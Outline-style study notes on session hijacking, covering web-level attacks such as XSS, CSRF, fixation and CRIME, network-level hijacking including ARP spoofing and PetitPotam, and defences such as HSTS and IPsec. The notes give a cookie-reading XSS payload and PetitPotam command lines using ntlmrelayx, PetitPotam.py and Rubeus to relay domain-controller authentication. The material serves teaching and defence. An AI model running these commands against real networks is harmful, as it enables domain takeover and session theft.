				- Predictable PRNG: Pseudorandom number generators (PRNGs) that are not truly random or are poorly seeded can produce predictable token sequences. If an attacker can determine the seed or algorithm used, they can predict future tokens. For example, if a PRNG uses the current time as a seed and the attacker is aware of this, they can replicate the token generation process and predict the tokens.
	- Compromising Session IDs Using Man-in-the-Middle or Manipulator-in-the-Middle Attack:
		- A man-in-the-middle (MITM) or manipulator-in-the-middle attack involves intruding into an existing connection between systems to intercept messages being transmitted. In this attack, the attacker employs various techniques to split a single TCP connection into two separate connections: one between the client and the attacker (client-to-attacker connection), and another between the attacker and the server (attacker-to-server connection).
		- Once the TCP connection is successfully intercepted, the attacker can read, modify, and inject fraudulent data into the communication. In the case of an HTTP transaction, the attacker specifically targets the TCP connection between the client and the server.
	- Compromising Session IDs Using Man-in-the-Browser (MITB) or Manipulator-in-the-Browser Attack:
		- A man-in-the-browser (MITB) or manipulator-in-the-browser attack is similar to a man-in-the-middle (MITM) attack, but the key difference is that it uses a Trojan horse to intercept and manipulate the communication between a browser and its security mechanisms or libraries. In this attack, the attacker positions a Trojan—already installed on the victim's system—between the browser and its security components. The Trojan can modify web pages, alter transaction content, or insert additional fraudulent transactions. All activities performed by the Trojan are invisible to both the user and the web application.
		- The primary goal of this attack is financial theft, particularly by manipulating transactions within internet banking systems. A man-in-the-browser attack can succeed even when security mechanisms such as SSL, public key infrastructure (PKI), and two-factor authentication are in place because all expected security measures appear to function normally.
		- In a Man-in-the-Browser attack, a Trojan infects the system and installs malicious code in the browser’s configuration. Once the browser is restarted, the code loads and monitors webpage visits. When the user logs into a targeted site, the Trojan extracts and modifies form data using the DOM interface. The modified data is sent to the server, which cannot distinguish it from the original. After the server processes the transaction, a receipt is generated and displayed with the original details, leaving the user unaware of the interception.
	- Compromising Session IDs Using Client-Side Attacks:
		- Client-side attacks target vulnerabilities in client applications that interact with malicious servers or process malicious data. Depending on the vulnerability, an attacker can exploit the application by sending an email with a malicious link or tricking a user into visiting a malicious website. Vulnerable client-side applications include unprotected websites, Java Runtime Environment, and browsers, with browsers being the major target.
		- Client-side attacks occur when clients establish connections malicious servers and process potentially harmful data. If there is no interaction between the client and server, no client-side attack is possible. For example, running a File Transfer Protocol (FTP) client without connecting to an FTP server avoids such attacks. In instant messaging, however, the application requires clients to log in to a remote server, making it more susceptible to client-side attacks.
		- The following client-side attacks can be used to compromise session IDs:
			- Cross-Site Scripting (XSS): XSS allows attackers to inject malicious client-side scripts into web pages that are viewed by other users.
			- Malicious JavaScript Codes: An attacker can embed a malicious script in a webpage that silently captures session tokens in the background and sends them to the attacker without triggering any warnings.
			- Trojans: A Trojan horse can modify the proxy settings in the user’s browser to route all sessions through the attacker’s machine.
	- Compromising Session IDs Using Client-Side Attacks: Cross-Site Scripting (XSS) Attack:
		- A cross-site scripting (XSS) attack is a client-side attack in which an attacker compromises a session token using malicious code or programs. This type of attack occurs when a dynamic web page receives malicious data from the attacker and executes it on the user’s system. Websites that generate dynamic pages cannot fully control how clients process the output, making them vulnerable to attack.
		- Attackers can insert malicious JavaScript, VBScript, ActiveX, HTML, or Flash applets into a vulnerable dynamic page. Once executed on the user’s machine, these scripts can collect personal information, steal cookies, redirect users to unexpected pages, or execute other malicious actions.
		- The user first establishes a valid session with the server. The attacker then sends a crafted link with malicious JavaScript. When the user clicks the link, the JavaScript runs automatically and performs the actions set by the attacker, such as displaying the user’s current session ID.
		Using this technique, the attacker can create specific JavaScript code to fetch the user’s session ID, such as: <SCRIPT>alert(document.cookie);</SCRIPT>
		- The attacker can then use the stolen session ID to establish a valid session with the server.
	- Compromising Session IDs Using Client-Side Attacks: Cross-Site Request Forgery (CSRF) Attack:
		- Cross-Site Request Forgery (CSRF), also known as a one-click attack or session riding, is an attack where the attacker exploits the victim’s active session with a trusted site to perform malicious activities such as unauthorized item purchases or the modification and retrieval of account information. In a CSRF web attack, the attacker creates a malicious form containing harmful information and sends it to the victim. When the victim unwittingly submits the form, the web server processes it as if it were a legitimate request because it originates from the authenticated user. Unlike cross-site scripting (XSS) attacks, which exploit the trust a user places in a website, CSRF exploits the trust a website places in the user's browser.
		- Steps Involved in a CSRF Attack:
			- In a CSRF attack, the attacker hosts a malicious web page containing a seemingly legitimate form that already includes the malicious request. The victim, deceived by the form’s appearance, interacts with it by entering credentials or other sensitive details.
			- Once the victim submits the form, it is sent to the trusted site via a POST or GET request. The trusted server, unaware of the malicious intent, processes the request as if it originated from the authenticated user’s browser since the user’s active session credentials are attached.
			- This results in the server unwittingly executing the attacker’s request, leading to unauthorized actions on the victim's behalf.
	- Compromising Session IDs Using Session Replay Attacks
		- In a session replay attack, the attacker captures a user’s authentication token by eavesdropping on the communication between the user and the server. Once the authentication token is captured, the attacker replays the authentication request to the server with the captured token to dodge the server, bypassing security checks and gaining unauthorized access to the server.
		- Steps Involved in a Session Replay Attack:
			- In a session replay attack, the user first establishes a connection with the web server, and the server requests authentication information as proof of identity.
			- The user then sends authentication tokens to the server. During this exchange, the attacker intercepts the communication and captures the user’s authentication token.
			- Finally, the attacker replays the request to the server using the stolen token, gaining unauthorized access.
	- Compromising Session IDs Using Session Fixation:
		- Web session security is designed to prevent attackers from intercepting, brute-forcing, or predicting the session ID issued by a web server to a user’s browser as proof of an authenticated session. However, this security approach overlooks the possibility of an attacker issuing a session ID to the user’s browser, forcing it to use a session ID chosen by the attacker. This type of attack is known as a session fixation attack because the attacker “fixes” the user's session ID in advance, rather than allowing the server to generate it randomly at the time of login.
		- The goal of a session fixation attack is to hijack a valid user session by exploiting flaws in the web application's session ID management. Many web applications allow users to authenticate themselves using an existing session ID instead of generating a new one upon login. In this scenario, the attacker provides a legitimate session ID to the victim and persuades the victim’s browser to use it. Once the victim logs in using the attacker-supplied session ID, the attacker, who already knows the session ID, can hijack the authenticated session.
		- Unlike other types of session hijacking, which involve stealing or predicting a session ID after the user has logged in, a session fixation attack involves fixing the session ID on the user’s browser before the user logs in.
		- Session Fixation Attack Techniques:
			- Attackers employ various methods to perform session fixation attacks, including:
			- Session Token in the URL Argument: The attacker embeds the session ID in a URL and tricks the victim into clicking the link.
			- Session Token in Hidden Form Field: The session ID is included in a hidden form field on a web page that the victim is lured into submitting.
			- Session ID in Cookie: The attacker manipulates cookies in the victim’s browser to insert the chosen session ID.
		- Session Fixation Attack Phases:
			- The attacker selects a technique based on how the target web application manages session tokens. The vulnerability exploited in a session fixation attack occurs when a server allows a user to authenticate using a fixed session ID. The attacker provides a valid session ID to the victim and persuades them to authenticate using that session ID.
			- A session fixation attack typically unfolds in the following three phases:
				- Session Set-Up Phase: In this phase, the attacker establishes a legitimate session with the target web server to obtain a valid session ID. If the target web server supports an idle session timeout feature, the attacker must ensure the session ID remains active by periodically sending requests to the server.
				- Fixation Phase: The attacker introduces the pre-established session ID to the victim’s browser, thereby "fixing" the session ID on the victim’s end.
				- Entrance Phase: The attacker waits for the victim to log in to the web server using the pre-determined session ID. Once the victim logs in, the attacker can access the victim's session using the same session ID.
		- Session Fixation Attack Steps:
			- Establishing the Session: The attacker first establishes a legitimate connection with the target web server. For example, the target server (e.g., http://citibank.com/) issues the attacker a session ID, such as 0D6441FEA4496C2.
			- Sharing the Fixed Session ID: The attacker embeds the established session ID in a URL, such as http://citibank.com/?SID=0D6441FEA4496C2, and sends it to the victim, often through email, messaging apps, or phishing websites.
			- Victim Interaction: The victim clicks the link, believing it to be legitimate (e.g., sent by the bank). This opens the login page of the server in the victim’s browser, with the session ID 0D6441FEA4496C2 already in use.
			- Login Process: The victim enters their credentials on the login page. The server recognizes that session ID 0D6441FEA4496C2 is active and associates it with the victim’s account, granting the victim access to their account without generating a new session.
			- Session Hijacking: Since the attacker already knows the session ID (0D6441FEA4496C2), they can access the victim's account by using the same session ID in a URL, such as http://citibank.com/?SID=0D6441FEA4496C2.
		- Key Insight: In a session fixation attack, the user unknowingly logs into a session that was pre-established by the attacker. This allows the attacker to share the same session as the victim and gain unauthorized access to sensitive resources or accounts.
	- Session Hijacking Using Proxy Servers:
		- In this attack, the attacker lures the victim into clicking on a bogus malicious link that appears legitimate but secretly redirects the victim’s request to the attacker’s server. The attacker’s server then forwards the request to the legitimate server on behalf of the victim and serves as a proxy for the entire transaction.
		- Acting as a proxy, the attacker intercepts and captures session information during the interaction between the legitimate server and the victim. This allows the attacker to gain unauthorized access to the victim’s session and potentially steal sensitive information or perform malicious actions on the victim’s behalf.
	- Session Hijacking Using CRIME Attack:
		- Compression Ratio Info-Leak Made Easy (CRIME) is a client-side attack that exploits vulnerabilities in the data compression features of protocols such as SSL/TLS (Transport Layer Security), SPDY, and HTTPS (HTTP Secure). The low potential for mitigating HTTPS compression vulnerabilities makes this attack particularly dangerous compared to other compression-related vulnerabilities.
		- When two hosts establish a connection using HTTPS, a TLS session is created, and data is transmitted in encrypted form. This encryption makes it difficult for attackers to read or modify the messages exchanged between the hosts. When a user logs into a web application, authentication data is typically stored in a cookie. This cookie is then used for authentication whenever the browser sends an HTTPS request to the web application.
		- In a CRIME attack, the attacker attempts to access the authentication cookie to hijack the victim’s session. By decrypting the session cookies, the attacker gains authentication information that can be used to establish a new session with the web application, effectively impersonating the victim.
		- CRIME Attacks Working:
			- In HTTPS, cookies are compressed using a lossless data compression algorithm (like DEFLATE) before encryption. As a result, the cookie value cannot be easily obtained through simple packet sniffing. However, a CRIME attack bypasses this protection by exploiting the way compression impacts the size of encrypted data.
			- Steps to Execute CRIME Attack:
				- Social Engineering: The attacker tricks the victim into clicking on a malicious link. This may inject malicious code into the victim's system or redirect them to a malicious website.
				- Sniffing HTTPS Traffic: If the victim has already established an HTTPS connection with a secured web application, the attacker intercepts the victim’s HTTPS traffic using techniques such as ARP spoofing.
				- Capturing Cookies: The attacker captures the authentication cookie from the victim’s HTTPS traffic. Since cookies are compressed and encrypted, the attacker cannot directly read the cookie value.
				- Sending Malicious HTTPS Requests: The attacker sends multiple HTTPS requests to the web application, each with the captured cookie value prepended by random characters.
				- Analyzing Compression Length: By observing the size of the encrypted and compressed HTTPS responses, the attacker identifies patterns in the compression ratio. These patterns allow the attacker to infer the actual value of the authentication cookie by analyzing the length of the data sent.
				- Hijacking the Session: Once the attacker predicts the authentication cookie, they use it to impersonate the victim and hijack their session with the web application. This allows the attacker to access confidential information such as passwords, social security numbers, and credit card details.
		- Detection and Tools: Attackers commonly use tools like CrimeCheck to detect whether a web server has TLS or HTTP compression enabled. If compression is enabled, the server is vulnerable to CRIME attacks.
	- Session Hijacking Using Forbidden Attack:
		- A forbidden attack is a type of man-in-the-middle (MITM) attack that occurs when a cryptographic nonce is reused during the establishment of an HTTPS session with a server. According to TLS specifications, nonces (arbitrary, one-time-use pieces of data) must never be reused. This attack exploits vulnerabilities in TLS implementations where the same nonce is mistakenly reused during data encryption with the Advanced Encryption Standard–Galois/Counter Mode (AES-GCM) in the TLS handshake.
		- Reusing a nonce during the TLS handshake allows attackers to perform a MITM attack by generating cryptographic keys used for authentication. This enables them to monitor, hijack, and manipulate the connection. After bypassing HTTPS protections, the attacker can inject malicious code or forged content, such as JavaScript or fake web forms, prompting the victim into disclosing confidential information like bank account details, passwords, or social security numbers.
		- Steps in Forbidden Attack:
			- The attacker monitors the connection between the victim and the web server and sniffs the nonce from the TLS handshake messages.
			- The attacker generates authentication keys using the nonce and hijacks the connection.
			- All the traffic between the victim and the web server flows through the attacker’s machine.
			- The attacker injects JavaScript code or fake web fields into the transmission towards the victim.
			- The victim reveals sensitive information such as bank account numbers, passwords, and social security numbers to the attacker.
	- Session Hijacking Using Session Donation Attack:
		- In a session donation attack, the attacker donates their own session ID to the target user. To carry out this attack, the attacker first obtains a valid session ID by logging into a service and then provides the same session ID to the target user. This session ID links the target user to the attacker’s account page without revealing any information to the victim. When the target user clicks the link and enters their details (such as username, password, or payment information) in a form, the entered details are linked to the attacker’s account.
		- To initiate this attack, the attacker can use techniques such as cross-site scripting (XSS), man-in-the-middle (MITM) attacks, or session fixation to send their session ID to the target.
		- Steps in Session Donation Attack:
			- First, the attacker logs into a service, establishes a legitimate connection with the target web server, and deletes any stored information.
			- The target web server (e.g., http://citibank.com/) issues a session ID, such as 0D6441FEA4496C2, to the attacker.
			- The attacker then donates their session ID (e.g., http://citibank.com/?SID=0D6441FEA4496C2) to the victim and lures the victim into clicking it to access the website.
			- The victim clicks the link, believing it to be legitimate, and it opens the server’s page in the victim’s browser with the session ID (SID=0D6441FEA4496C2). The victim then enters their information on the page and submits it.
			- The attacker can now log in as themselves and acquire the victim’s information.
- Network-Level Session Hijacking:
	- Network-level session hijacking relies on compromising transport and Internet protocols used by web applications at the application layer. By targeting network-level sessions, attackers can gather critical information that is used to exploit application-level sessions.
	- Three-way Handshake:
		- The TCP three-way handshake establishes a connection between two parties by exchanging essential parameters. First, the client, in the CLOSED state, sends its Initial Sequence Number (ISN) with the SYN flag, transitioning to the SYN-SENT state.
		- The server, in the LISTENING state, acknowledges the client’s ISN, sends its own ISN with the SYN flag, and moves to the SYN-RECEIVED state.
		- Finally, the client acknowledges the server’s ISN and transitions to the ESTABLISHED state, with the server doing the same upon receiving the acknowledgment, enabling communication.
		- To terminate the connection, the RST flag forces an immediate shutdown to the CLOSED state, while the FIN flag initiates a graceful closure, transitioning to the CLOSE-WAIT state.
		- For packets to be accepted during communication, their sequence numbers must fall within the expected range; otherwise, they are dropped, and an acknowledgment with the expected sequence number is sent. Successful communication requires IP addresses, port numbers, and sequence numbers.
		- An attacker can easily determine the IP address and port number, as these are visible in the IP packets and remain constant throughout the session. However, sequence numbers change with each packet, making them harder to predict. For a blind hijack, the attacker must accurately guess the sequence numbers.
		- If the attacker successfully tricks the server into accepting and executing spoofed packets, they can hijack the session. By anticipating the next sequence number and acknowledgment (ACK) number that the client will send, the attacker can spoof the client’s address and initiate communication with the server.
	- Types of Network-Level Session Hijacking:
		- TCP/IP Hijacking:
			- TCP/IP hijacking involves an attacker intercepting an established connection between two communicating parties by using spoofed packets to impersonate one of them. The attacker redirects the TCP traffic to their own machine, causing the victim’s connection to hang. The attacker can then communicate with the host machine on the victim’s behalf.
			- To carry out a TCP/IP hijacking attack, the attacker must be on the same network as the victim, while the target server and victim machine can be located anywhere. This technique is particularly effective against systems that rely on one-time passwords.
			- TCP/IP Hijacking Steps:
				- In TCP/IP hijacking, the attacker intercepts a victim’s connection and uses their IP address to send spoofed packets with predicted sequence numbers.
				- The receiver processes the spoofed packet, updates the sequence number, and sends an acknowledgment (ACK) to the victim.
				- Unaware of the spoofed packet, the victim ignores the ACK, leading to a desynchronized connection.
				- The attacker then continuously sends spoofed packets, maintaining communication with the receiver while the victim’s connection hangs.
				- The server mistakenly drops packets from the victim, allowing the attacker to successfully hijack the session and control the communication.
		- IP Spoofing (Source-Routed Packets):
			- Source routed packets allow attackers to gain unauthorized access by using a trusted host’s IP address. This type of attack enables the attacker to create acceptable packets to insert into an active TCP session. The attacker first spoofs the trusted host’s IP address, tricking the server into accepting packets as if they were from the trusted host. Using the source-routing technique, the attacker specifies the path the packets take from the source to the destination, convincing the server it is communicating with the legitimate user.
			- After successfully spoofing the IP address, the attacker manipulates the sequence and acknowledgment (ACK) numbers. The forged packets are then injected into the TCP session before the client can respond. This leads to a desynchronized state, as the sequence and ACK numbers are no longer aligned. The original packets from the client are lost because the server processes the attacker’s packet with a new Initial Sequence Number (ISN). Subsequent packets are also source routed to a destination specified by the attacker, completing the hijack.
		- RST Hijacking:
			- RST hijacking involves injecting an authentic-looking (forged) reset (RST) packet into an active connection using a spoofed source IP address and a predicted acknowledgment (ACK) number. If the attacker accurately predicts the ACK number, the victim accepts the reset packet as legitimate and terminates the connection, believing it was sent by the source.
			- This attack can be executed using packet-crafting tools such as Colasoft Packet Builder and TCP/IP analysis tools such as tcpdump.
		- Blind Hijacking:
			- In blind hijacking, an attacker injects malicious data or commands into an intercepted TCP session, even when source-routing is disabled. To perform this attack, the attacker must correctly guess the next Initial Sequence Number (ISN) of a computer attempting to establish a connection.
			- While the attacker can send malicious data or commands, such as altering password settings to gain access from another location, they cannot view the response. To see the response, a Man-in-the-Middle (MITM) attack would be a more effective option.
		- UDP Hijacking:
			- The User Datagram Protocol (UDP) does not use packet sequencing or synchronization, making UDP sessions more vulnerable to attacks than TCP sessions. Since UDP is connectionless, it is easier to modify data without the victim noticing. In a network-level session hijack, the attacker sends a forged server reply to a client’s UDP request before the server can respond, taking control of the session.
			- The server’s reply can be easily intercepted using sniffing techniques. A Man-in-the-Middle (MITM) attack can further facilitate UDP hijacking by preventing the server's reply from reaching the client in the first place.
			- UDP Hijacking Working:
				- Spoofing the Source IP Address: Since UDP does not require a handshake before data transmission, attackers can send UDP packets with a spoofed source IP address, impersonating another host.
				- Intercepting Traffic: The attacker sends forged UDP packets to either the client or server. These packets appear to come from a legitimate source but may contain malicious data or instructions.
				- Manipulating Communication: By injecting false information into the data stream or initiating unauthorized requests, the attacker can manipulate the behavior of an application relying on UDP traffic.
		- Man-in-The-Middle (Packet Sniffing) Attack Using Forged ICMP and ARP Spoofing:
			- An MITM (Man-in-the-Middle) attack involves intercepting communication between a client and server using a packet sniffer. The attacker changes the client’s default gateway to reroute packets through their own machine.
			- This is achieved through two techniques: Forged ICMP and ARP Spoofing. In both methods, the attacker manipulates the routing of packets in transit between the client and server, redirecting them through the attacker’s machine.
			- Forged Internet Control Message Protocol (ICMP):
				- The Internet Control Message Protocol (ICMP) is an extension of IP used to send error messages. In this attack, the attacker forges ICMP packets to deceive the client and server. These forged ICMP packets are used to redirect traffic between the client and server through the hijacker’s machine. The attacker sends error messages, falsely indicating issues in processing packets via the original connection, which causes the client and server to route traffic through the attacker’s path instead.
			- Address Resolution Protocol (ARP) Spoofing:
				- Hosts use Address Resolution Protocol (ARP) to map IP addresses to MAC (hardware) addresses. ARP spoofing involves manipulating the ARP tables of hosts by broadcasting false ARP replies. The attacker sends forged ARP replies to update the ARP tables of hosts that are broadcasting ARP requests. This causes the traffic to be routed through the attacker’s machine instead of the legitimate destination IP address.
		- PetitPotam Hijacking:
			- In a PetitPotam attack, an attacker forces a domain controller (DC) to initiate authentication to the attacker’s server. The attacker uses Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC) API to hijack the authentication session. The attacker’s SMB server manipulates the session, making the domain controller believe the attacker is a legitimate user, thus allowing the attacker to capture the domain controller’s NTLM hash. To carry out this attack, the attacker must have valid credentials of a legitimate user within the network.
			- Once the attacker obtains the NTLM hash, they relay it to the Active Directory Certificate Services (AD CS) to generate a certificate. In some cases, AD CS may also act as the domain controller. Using the generated certificate, the attacker gains administrative privileges, taking full control of the AD server and, by extension, the entire network managed by the domain controller.
			- PetitPotam Hijacking Steps:
				- The attacker uses previously captured NTLM credentials to authenticate with the target server.
				- The attacker utilizes the EfsRpcOpenFileRaw command from the MS-EFSRPC API to coerce the target server into performing NTLM authentication for another system.
				- The attacker then initiates an NTLM relay attack to gain remote access to the target Active Directory Certificate Services (AD CS).
				- Finally, the attacker creates an AD certificate, which grants administrative privileges to the target AD server.
			- Commands to Perform PetitPotam Hijacking Attack:
				- Use the following command to identify the certificate authority:
					=> certutil.exe
				- Use the following command from the Impacket toolkit to set up HTTP/SMB configuration and capture credentials from the domain controller (DC):
					=> ntlmrelayx.py -t <URL of Certificate Authority with web enrollment> -smb2support --adcs --template DomainController
				- To force authentication using the captured credentials via the MS-EFSRPC API call, run:
					=> python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>
				- If the DC is vulnerable, can launch PetitPotam without credentials to receive the certificate’s NTLM hashes by running:
					=> python3 PetitPotam.py <Attacker’s IP> <IP of DC>
				- After obtaining the NTLM hashes, use password-cracking tools like Rubeus to request a Kerberos ticket for the machine containing DC account privileges:
					=> Rubeus.exe asktgt /outfile:<output_file.kirbi> /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>

- Session Hijacking Countermeasures:
	- All networks using TCP/IP are vulnerable to various types of session hijacking attacks. These attacks are particularly difficult to detect, and users often fail to notice them unless the attacker causes significant damage.
	- Signs of Session Hijacking Attack:
		- A sudden surge in network activity, leading to decreased system performance.
		- Overloaded servers due to simultaneous requests from both the legitimate client and the hijacker.
	- Session Hijacking Detection Methods:
		- Manual Method (Using Packet Sniffing Software)
			- The manual method involves using packet-sniffing software such as Wireshark and SteelCentral Packet Analyzer to monitor session hijacking attacks. The packet sniffer captures packets in transit across the network, which are then analyzed using various filtering tools.
			- Forced ARP Entry:
				- A forced ARP entry involves replacing the MAC address of a compromised machine in the server's ARP cache with a different one to restrict network traffic to the compromised machine.
				- A forced ARP entry should be performed in the following cases:
					- Repeated ARP updates
					- Frames exchanged between the client and server with different MAC addresses
					- ACK storms
		- Automatic Method (IDS and IPS):
			- The automatic method involves using intrusion detection systems (IDS) and intrusion prevention systems (IPS) to monitor incoming network traffic. If a packet matches any attack signature in the internal database, the IDS generates an alert, while the IPS blocks the traffic from entering the network.
	- Protecting Against Session Hijacking:
		- Use Secure Shell (SSH) to establish a secure communication channel.
		- Transmit authentication cookies over HTTPS connections.
		- Generate a new session ID upon login and accept only server-generated IDs.

		- Use a challenge-response mechanism (e.g., CAPTCHA) when suspicious activity is detected.
		- Enforce an absolute session timeout, regardless of user activity.
	- Web Development Guidelines to Prevent Session Hijacking:
		- Attackers typically hijack sessions by exploiting vulnerabilities in session establishment mechanisms. Web developers often overlook security, but following these guidelines during development can help minimize or eliminate the risk of session hijacking:
			- Create session keys using long, random strings or numbers to make them difficult to guess.
			- Regenerate the session ID after a successful login to prevent session fixation attacks.
			- Encrypt both session data and the session key during transmission between users and web servers.
			- Implement SSL/TLS to encrypt all network communication.
			- Expire sessions immediately when the user logs out.
			- Prevent eavesdropping within the network.
			- Reduce the lifespan of sessions and cookies.
			- Use restrictive cache directives for HTTP and HTTPS traffic, such as:
				- "Cache-Control: no-cache, no-store"
				- "Pragma: no-cache"
				- Equivalent META tags on all, or at least sensitive, web pages.
			- Avoid creating sessions for unauthenticated users unless necessary.
			- Use the HTTPOnly attribute for cookies storing session IDs.
			- Set the Secure flag on cookies to ensure they are only sent over HTTPS and encrypt them before transmission.
			- Verify that all session requests originate from the same IP address and user agent.
			- Implement continuous device verification to ensure the session remains controlled by the legitimate user.
			- Use risk-based authentication at different levels before granting access to sensitive information.
			- Perform authentication and integrity verification between VPN endpoints.
			- Destroy server-side sessions upon user deauthentication instead of relying solely on session expiration.
			- Ensure that the web application redirects HTTP requests to HTTPS using server settings or redirection techniques.
			- Require user re-authentication and generate a new session before granting access to sensitive functions.
			- Use secure session management provided by trusted web frameworks instead of implementing custom session handling.
			- Enforce HTTPS on all pages of the web application, not just the login pages.
	- Web User Guidelines to Prevent Session Hijacking:
		- Avoid clicking on links received through emails or instant messages (IMs).
		- Use firewalls to block malicious content and restrict cookie access.
		- Ensure that websites are certified by trusted certifying authorities.
		- Clear history, offline content, and cookies after confidential transactions.
		- Prefer HTTPS over HTTP when transmitting sensitive data.
		- Always log out by clicking the logout button instead of just closing the browser.
		- Disable or remove untrusted add-ons, enabling them only when necessary.
		- Use one-time passwords (OTP) for critical transactions (e.g., credit card payments).
		- Regularly update antivirus software to prevent malware from stealing cookies.
		- Avoid accessing sensitive accounts or making financial transactions over public Wi-Fi.
		- Disable auto-connect to open Wi-Fi networks.

	- Approaches to Prevent Session Hijacking:
		- HTTP Strict Transport Security (HSTS):
			- HTTP Strict Transport Security (HSTS) is a web security policy designed to protect HTTPS websites from man-in-the-middle (MITM) attacks. It enforces secure communication by requiring web browsers to interact with the server exclusively over HTTPS, automatically converting all insecure HTTP connections to HTTPS.
			- This ensures that all communication between the web server and browser remains encrypted and that responses originate from an authenticated server, preventing session hijacking attempts.
		- Token Binding:
			- Token Binding enhances security by protecting client-server communication against session hijacking. When a user logs into a web application, a session ID (token) is generated and used to authenticate requests. Attackers can hijack a session by capturing and reusing this token. With token binding, the client generates a unique public-private key pair for each connection.
			- Upon connecting to the server, the client signs a message using its private key and sends it along with its public key. The server then verifies the signature using the public key, ensuring that only the legitimate client—who holds the private key—can initiate the session. Since each connection uses a new key pair, an attacker cannot reuse a captured signature, making session hijacking significantly more difficult.
	- Approaches to Prevent MITM Attacks:
		- Man-in-the-middle (MITM) attacks occur when attackers intercept traffic between two endpoints. These attacks are often passive, making them difficult for victims to detect. Since detection is challenging, prevention is the most effective defense.
		- The following approaches help prevent MITM attacks:
			- DNS over HTTPS (DoH): DNS over HTTPS (DoH) is an enhanced version of the DNS protocol designed to prevent attackers and ISPs from snooping on users’ web activities or DNS queries during the lookup process. Unlike traditional DNS, DoH encrypts DNS queries using HTTPS, sending them through port 443 to blend with regular HTTPS traffic, making interception significantly harder. DoH also improves privacy by sending only a portion of the requested domain name to fetch results, rather than the full URL. This prevents attackers from reconstructing browsing behavior. Major web browsers like Chrome, Mozilla Firefox, and Microsoft Edge have supported DoH for years, with Mozilla making it the default for U.S. users in 2020.
			- WPA3 Encryption: Wi-Fi Protected Access 3 (WPA3) is a wireless security protocol designed to enhance encryption and authentication in Wi-Fi networks. It prevents unauthorized users from connecting to a network by using stronger encryption mechanisms. Unlike its predecessor (WPA2), WPA3 offers protection against brute-force attacks, making it significantly harder for attackers to gain access and conduct MITM attacks.
			- VPN (Virtual Private Network): A VPN creates an encrypted tunnel over a public network, ensuring secure transmission of sensitive data between endpoints. By using key-based encryption, VPNs prevent attackers from intercepting or decrypting communication, reducing the risk of MITM attacks.
			- Two-Factor Authentication (2FA): Two-factor authentication adds an extra layer of security by requiring users to provide a second verification factor (e.g., a one-time code sent to their phone) in addition to their password. This prevents attackers from easily compromising accounts, even if they steal login credentials, reducing the risk of session hijacking and brute-force attacks.
			- Password Manager: A password manager is a tool used to securely store and manage credentials. It generates strong, unique passwords for web applications and encrypts them under a master key, preventing attackers from intercepting and exploiting weak passwords in MITM attacks.
			- Zero-Trust Principles: Zero-trust security follows the principle of "Never trust, always verify." It requires strict authentication and access controls for all users, whether they are inside or outside the network. Even internal users must undergo authentication, minimizing the risk of unauthorized access and MITM attacks.
			- Public Key Infrastructure (PKI): Public Key Infrastructure (PKI) is a framework for managing digital certificates to establish secure communication. It ensures that entities involved in communication are legitimate by verifying certificates issued by trusted Certificate Authorities (CAs). Any attempt to use a fake certificate can be detected, preventing MITM attacks.
			- Network Segmentation: Network segmentation involves dividing a network into smaller, isolated sub-networks to enhance security. This limits an attacker’s ability to move laterally within the network and intercept communications, reducing the risk of MITM attacks and unauthorized access to sensitive data.
	- IPsec (Internet Protocol Security):
		- IPsec is a protocol suite developed by the Internet Engineering Task Force (IETF) to secure IP communications by authenticating and encrypting each IP packet in a communication session. It provides cryptographically based security for both IPv4 and IPv6, ensuring secure data transmission over networks.
		- IPsec supports various security features, including network-level peer authentication, data origin authentication, data integrity verification, encryption for data confidentiality, and replay protection. It is commonly used to implement VPNs and to enable secure remote access to private networks via dial-up connections. IPsec operates in two encryption modes: transport mode and tunnel mode, with both communicating devices required to share a public key for secure communication.
		- IPsec policies can be configured and managed through Group Policy settings within Active Directory, allowing administrators to enforce security policies at the domain, site, or organizational unit level. At the IP layer, IPsec provides comprehensive security, protecting both IP and upper-layer protocols such as TCP, UDP, ICMP, and BGP. Its robust security capabilities make it a key component in modern secure networking.
		- Security Services Provided by IPsec:
			- Replay Attack Protection (prevention of packet retransmission attacks)
			- Data Confidentiality (encryption to protect sensitive information)
			- Access Control (restricting unauthorized access)
			- Connectionless Integrity (ensuring that transmitted data is not altered)
			- Data Origin Authentication (verifying the source of transmitted data)
			- Data Integrity (ensuring data remains unaltered in transit)
			- Limited Traffic-flow Confidentiality (hiding metadata about traffic patterns)
			- Network-level Peer Authentication (verifying the legitimacy of communicating devices)
		- Components of IPsec:
			- IPsec Driver: A software component responsible for performing protocol-level functions required to encrypt and decrypt packets.
			- Internet Key Exchange (IKE): A protocol that generates security keys for IPsec and other cryptographic protocols, enabling secure communication.
			- Internet Security Association and Key Management Protocol (ISAKMP): A framework that establishes and manages security associations (SAs), allowing two computers to communicate securely by encrypting exchanged data.
			- Oakley: A key exchange protocol that utilizes the Diffie-Hellman algorithm to generate a master key and session-specific keys for IPsec data transfer.
			- IPsec Policy Agent: A Windows OS service that enforces IPsec policies for all network communications initiated from the system.
		- Steps in the IPsec Process:
			- The consumer sends a message to the service provider.
			- The consumer's IPsec driver checks the outgoing packet's address or type against the IP filter.
			- If a match is found, the IPsec driver notifies ISAKMP to initiate security negotiations with the service provider.
			- The service provider's ISAKMP receives the security negotiation request.
			- Both parties initiate a key exchange, establishing an ISAKMP Security Association (SA) and a shared secret key.
			- Both parties agree on the security level for the information exchange, establishing IPsec SAs and encryption keys.
			- The consumer's IPsec driver encrypts and transfers packets to the appropriate connection type for transmission to the service provider.
			- The service provider receives the encrypted packets and transfers them to its IPsec driver.
			- The service provider's IPsec driver uses the inbound SA and key to verify the digital signature and begin decryption.
			- The provider's IPsec driver transfers the decrypted packets to the OSI transport layer for further processing.
		- Modes of IPsec:
			- The configuration of IPsec involves two different modes: tunnel mode and transport mode. These modes are associated with the functions of two core protocols: Encapsulation Security Payload (ESP) and Authentication Header (AH). The choice of mode depends on the specific requirements and implementation of IPsec.
			- Transport Mode:
				- In transport mode, IPsec encrypts only the payload of the IP packet while leaving the IP header intact. This ensures that only the data payload is encrypted or authenticated. Transport mode is primarily used for end-to-end communication between two hosts.
				- For Encapsulation Security Payload (ESP) in transport mode, IPsec encrypts only the payload, leaving the header unchanged. It authenticates the two connected computers and offers optional encryption for data transfer. Additionally, it is compatible with Network Address Translation (NAT), making it suitable for VPN services in NAT-based networks.
			- Tunnel Mode:
				- In tunnel mode, IPsec encapsulates the entire IP packet, including both the payload and the original IP header, and then encrypts the entire packet. This encapsulated packet becomes the payload of a new IP packet with a new IP header.
